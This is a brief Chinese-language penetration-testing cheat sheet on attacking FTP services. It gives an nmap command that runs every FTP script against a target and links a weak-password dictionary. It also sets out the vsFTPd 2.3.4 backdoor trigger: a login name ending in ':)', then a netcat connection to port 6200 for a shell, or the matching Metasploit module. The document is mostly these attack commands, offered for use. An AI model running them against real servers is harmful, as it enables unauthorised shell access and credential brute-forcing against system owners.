# FTP服务

## 弱口令

自动化匿名扫描
```bash
nmap --script ftp-* -p 21 IP地址
```

弱口令字典

[FTP弱口令](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%9B%9B%E7%AB%A0/FTP/%E5%BC%B1%E5%8F%A3%E4%BB%A4.txt)

## FTP后门

1.vsFTPd 2.3.4

user = msfadmin:)

pass = 任意

```bash
nc [IP地址] 6200
```

使用Metasploit
```bash
exploit/unix/ftp/vsftpd_234_backdoor
```
